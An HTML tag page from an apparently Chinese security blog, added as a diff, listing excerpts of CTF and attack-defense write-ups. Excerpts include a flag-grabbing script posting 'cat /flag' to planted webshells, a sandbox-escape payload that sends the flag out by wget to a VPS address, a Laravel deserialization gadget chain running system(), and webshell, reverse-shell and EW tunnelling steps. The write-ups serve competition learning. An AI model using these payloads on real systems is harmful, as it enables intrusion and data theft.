@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>ctf :: Ca1s1&#39;Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://vuln.top/tags/ctf/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://vuln.top/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://vuln.top/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://vuln.top/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="ctf">
+<meta property="og:description" content="" />
+<meta property="og:url" content="https://vuln.top/tags/ctf/" />
+<meta property="og:site_name" content="Ca1s1&#39;Blog" />
+
+  
+    <meta property="og:image" content="https://vuln.top/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+  <link href="/tags/ctf/index.xml" rel="alternate" type="application/rss+xml" title="Ca1s1&#39;Blog" />
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://vuln.top">
+  <div class="logo">
+    Ca1s1'Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/">about</a></li>
+        
+      
+        
+          <li><a href="/link/">link</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/" >about</a></li>
+        
+      
+        
+          <li><a href="/link/" >link</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+  
+  <div class="posts">
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/awd-flag-script/">AWD FLAG SCRIPT</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2022-04-22 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/awd/">AWD</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/ctf/">CTF</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            AWD FLAG脚本 之前AWD的自动写🐴获取flag脚本。
+import requests import re import json import time import random def filename(): return &#39;.&#39;+str(int(random.uniform(10000000, 99999999)))+&#39;.php&#39; def exp1(target): url = &#39;http://&#39;+target+&#39;/admin/test.php&#39; data = {&#34;cmd&#34;:&#34;system(&#39;cat /flag&#39;);&#34;} try: r = requests.post(url=url, data=data, timeout=3) res = &#39;flag{&#39;+re.findall(r&#39;.{8}-.{4}-.{4}-.{4}-.{12}&#39;, r.text)[0]+&#39;}&#39; # res = re.findall(r&#34;flag{.*}&#34;, r.text) print(&#39;[+]Flag Found: &#39;+target+&#39;-&gt;&#39;+res) return res except Exception: pass def exp2(target): url = &#39;http://&#39;+target+&#39;/about.php?file=/flag&#39; try: r = requests.get(url=url,timeout=3) res = &#39;flag{&#39;+re.findall(r&#39;.{8}-.{4}-.{4}-.{4}-.{12}&#39;, r.text)[0]+&#39;}&#39; print(&#39;[+]Flag Found: &#39;+target+&#39;-&gt;&#39;+res) return res except Exception: pass def exp3(target): url = &#39;http://&#39;+target+&#39;/admin/editor.
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/awd-flag-script/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/guanan2021wp/">观安CTF 2021 WriteUp</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2021-09-05 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            WEB Baby Calc 通过测试发现该环境为python3沙盒逃逸 通过网上公开的POC发现存在代码执行，但是无法回显 尝试反弹SHELL均失败 发现系统不存在curl命令，但存在wget通过wget命令携带回显带出到vps
+如下图使用wget，把命令包含在``中在使用base64带到vps中 expr=__import__(&#34;os&#34;).__getattribute__(&#34;metsys&#34;[::-1])(&#34;wget%20http://49.234.223.23:1234/1.txt?data=`cat%20/flag_is_here|grep%20flag|base64`&#34;) vps监听： Baby WEB 题目提供了源代码，查看incloud.php文件，发现57行存在file_put_contents函数，且password未做限制。通过构造poc使password造成任意文件读取漏洞
+POC:1|../../../../../../../../flag|
+注册任意用户名，密码为POC，登陆密码为1。 登陆后返回flag Misc 老电脑的内存 经典的内存取证题目，通过imageinfo来获取该内存镜像的摘要信息 查看缓存在内存中的注册表： 获取 SAM 表中的用户： 查看内存中系统的密码： CMD5解密 通过filescan查找ctf用户下的文件 发现1.png
+volatility -f Windows\ 7-c0e05742.vmem --profile=Win7SP1x86_23418 filescan | grep ctf 将1.png dump下来，查看文件。与密码结合获得flag ##被加密的wifi 通过分析数据包发现key为88888888 通过airdecap-ng命令输入密码解密数据包 在已解密的数据包中找到flag release 拿到一张图片，首先使用binwalk分离文件，没有发现有用信息 通过winhex修改文件高度 得到一半flag 翻到文件底部发现很多20和09，想到通过二进制生成二维码，将20修改为0，09改为1 使用脚本转换为图片，得到二维码 扫描得到flag
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/guanan2021wp/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/hufuctfweb/">2021年虎符线下赛WEB</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2021-05-09 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/laravel/">Laravel</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            tinypng 题目提供了源代码，通过php artisan 命令，可以看到是Laravel 8.15框架 首先查看路由信息 先查看一下fileupload路由，可以发现文件上传时对内容进行了过滤，且只允许上传png 接着我们看image路由，进入ImageController，$source可控接着判断是否为png结尾，如果为png结尾则传给imgcompress类。 进入imgcompress类，$this-&gt;src为我们传入的$source 接着又传递给compressImg类，调用了openImg方法 将$source传递给了getimagesize，getimagesize可以触发phar反序列化 现在只需要绕过文件上传内容检测即可，我们可以通过gzip的方式绕过。 从网上找一个Laravel 8的公开的反序列化POP链漏洞即可，如下给出我使用的exp。
+namespace Illuminate\Broadcasting {class PendingBroadcast {protected $events;protected $event;public function __construct($events, $event) {$this-&gt;events = $events;$this-&gt;event = $event;}}class BroadcastEvent {public $connection;public function __construct($connection) {$this-&gt;connection = $connection;}}}namespace Illuminate\Bus {class Dispatcher {protected $queueResolver;public function __construct($queueResolver){$this-&gt;queueResolver = $queueResolver;}}}namespace {$c = new Illuminate\Broadcasting\BroadcastEvent(&#39;whoami&#39;);$b = new Illuminate\Bus\Dispatcher(&#39;system&#39;);$a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);#print(urlencode(serialize($a)));@unlink(&#34;phar.
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/hufuctfweb/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/ctfneiwang/">CTF内网渗透题</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2020-10-15 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            记一次CTF内网渗透，据说是从护网复现过来的。
+这是第一个flag。。。 既然我们知道这是wordpress正常套路那我们通过wpscan扫描一下
+如下图发现存在xmlrpc.php，根据经验这个php存在用户密码爆破，那我们尝试一下 参考：Wordpress xmlrpc.php -common vulnerabilites &amp; how to exploit them 通过文章发布的地方知道存在一个power_admin的用户 通过xmlrpc.php验证一下 不知道为什么是不是我个人问题输入正确账号密码后没有直接给我跳转到wp-admin/index.php页面还是在原来页面。我只能通过替换cookie后直接访问。 在媒体库内直接上传冰蝎一句话后访问正常操作 之后通过冰蝎配合msf反弹shell 内网穿透我比较常用的手法是通过ew配合proxychains 如何通过EW做Socks5代理进行内网渗透 - 知乎 ew for linux下载地址：ew
+首先在公网的vps上通过ew监听1080和1024 ./ew_for_linux64 -s rcsocks -l 1080 -e 1024 &amp; 之后通过msf把ew客户端上传到靶机上
+meterpreter &gt; upload /root/ew/ew_for_linux64 /tmp/ [*] uploading : /root/ew/ew_for_linux64 -&gt; /tmp/ [*] uploaded : /root/ew/ew_for_linux64 -&gt; /tmp//ew_for_linux64 meterpreter &gt; meterpreter &gt; shell Process 20657 created. Channel 0 created. cd /tmp chmod 777 ew_for_linux64 ./ew_for_linux64 -s rssocks -d 118.
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/ctfneiwang/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/2019shendun/">2019神盾杯</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2020-08-23 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/php/">php</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/js/">js</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            首届“神盾杯”上海市网络安全竞赛，去年的比赛。
+0x00 babyJS 操作内容：
+查看源码 找不到被调用的CheckLogin函数
+看到script中有用到unespace和escape等函数 用于编码字符串
+将eval传参改为alert 显示为弹窗
+发现check函数 并将flag与用户输入做比较 得到flag
+FLAG值：
+flag{a5a5f402f6dc62acd3e848900a17513f}
+0x01 crypto_easy_1 操作内容：
+下载文件
+发现3行类似的数据 并且长度一致。
+:左边的长度为42 右边的长度为56 ，猜测右边被base64编码过 进行解码 比较长度
+长度一致 为42
+异或运算一下 可以得到Key随后将key代入 与base64解码后的密文异或比较 得到flag
+解密脚本如下:
+import base64 x = &#39;v6&#34;wo5UIP9c4IdCk1o6qZhhB5DKZhVBwBzONl1JRIz:TwB2RyZYBCEVbjBjID17UkUeeDAwPBh1dg86AyAgcSQ4QygYGnAuJQYw&#39; y = &#39;zjS0ubQE2hw29FL2qs61ZNOVyFaf6IAjUZ7X8ijuVg:Q1wHADwPAC13PyRlUB90CwUCeHAwGj9hOg0QP34/cjkvY1AOTigOAhkt&#39; z = &#39;pJryZpVUNpSFi06WlKGkS0Uka6zw1sNCX&#34;h2urQoyg:SXwmSRMdBz0LJwARAGkObhg6CSo5ZCVcIn0LLnkFfRAiGw9kAzM1GDYt&#39; a, b = x.split(&#39;:&#39;) c, d = y.split(&#39;:&#39;) e, f = z.split(&#39;:&#39;) b = base64.b64decode(b) d = base64.b64decode(d) f = base64.b64decode(f) g = base64.b64decode(&#39;X1o1VzIPaVgjbmNvCnQAC0ZHY3BbMUkaeylDYWVOCzZDXwJjR3hTFiw3&#39;) flag = &#39;&#39; for i in range(42): t = ord(a[i]) ^ ord(b[i]) flag += chr(ord(g[i]) ^ t) print(flag) FLAG值：
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/2019shendun/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/wandouctf/">豌豆杯入学CTF</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2019-10-16 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/php/">php</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            1.题目:小可爱 第一步肯定是绕过本地回环地址 一开始想到的是x-forward-for等告诉服务器我的地址但发现没有绕过 看题目题目是说来源地址想到了referer成功绕过 这里没啥思路只能爆破 密码为orange 访问到另外一个页面 然后登录。 发现是一张迪丽热巴的图片 这个主管很喜欢迪丽热巴啊！！ 将图片下载下来，用binwalk查看下发现有压缩包!foremost下得到压缩包发现有密码 这个地方解了很久发现使用Dilraba的md5。。。。 得到一张图片再一次foremost得到一个压缩包成功拿到flag 2.题目:单身二十年 &lt;?php header(&#34;Content-type:text/html;charset=utf-8&#34;); show_source(__FILE__); if($_COOKIE[&#39;token&#39;]==&#39;5D41402ABC4B2A76B9719D911017C592&#39;){ $file = &#39;dump/&#39;.md5(base64_encode(mt_rand(1,100))).&#39;.txt&#39;; file_put_contents($file,file_get_contents(&#39;327A6C4304AD5938EAF0EFB6CC3E53DC.php&#39;)); sleep(10); unlink($file); }else{ header(&#39;Location: index.php&#39;); } setcookie(&#34;token&#34;); ?&gt; 看懂源码发现访问页面会睡眠十秒他会把flag写入到一个1到100随机数字经过base64,md5的txt文件里。 一种是用burp直接get到这里我就不演示了,我是直接写的python,访问下页面执行脚本就行了。 import base64 import hashlib import requests for i in range(1,101): headers = {&#39;Content-type&#39;:&#39;text/html;charset=utf-8&#39;} encodestr = base64.b64encode(str(i).encode(&#39;utf-8&#39;)) cookies = {&#39;token&#39;:&#39;5D41402ABC4B2A76B9719D911017C592&#39;} #print(encodestr) m = hashlib.md5() m.update(encodestr) #print(m.hexdigest()) a = m.hexdigest() url = &#39;http://106.14.145.133:8081/web10/dump/&#39;+a+&#39;.txt&#39; #print(url) url_get = requests.get(url,headers=headers,cookies=cookies,timeout=2) #print(url_get.headers) #print(url_get.cookies) if url_get.
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/wandouctf/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/redhat2021/">RedHat2021 CTF</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2019-10-15 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/rce/">rce</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/%E7%A0%94%E7%A9%B6/">研究</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/sql/">sql</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            漏洞复现
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/redhat2021/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/tongdaoarce/">通达OA文件上传&amp;文件包含导致RCE复现</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2019-10-15 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/rce/">rce</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/%E7%A0%94%E7%A9%B6/">研究</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            漏洞复现
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/tongdaoarce/"> →</a>
+          </div>
+        
+      </article>
+    
+
+    <div class="pagination">
+  <div class="pagination__buttons">
+    
+    
+  </div>
+</div>
+
+  </div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2024 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
